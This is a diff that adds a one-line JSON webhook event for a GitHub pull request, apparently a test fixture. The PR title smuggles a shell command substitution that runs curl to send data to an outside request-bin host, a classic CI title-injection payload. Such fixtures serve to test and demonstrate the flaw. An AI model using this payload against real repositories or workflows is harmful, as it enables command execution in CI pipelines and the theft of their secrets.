@@ -1,0 +1,1 @@
+{"pull_request": {"title": "pwned $(curl -X PUT -d \"pwned_title\" https://open-hookbin.vercel.app/61967241)", "head": {"repo": {"full_name": "UserB/repo"}}, "base": {"repo": {"full_name": "UserA/repo"}}, "state": "open", "merged": false}, "action": "opened"}
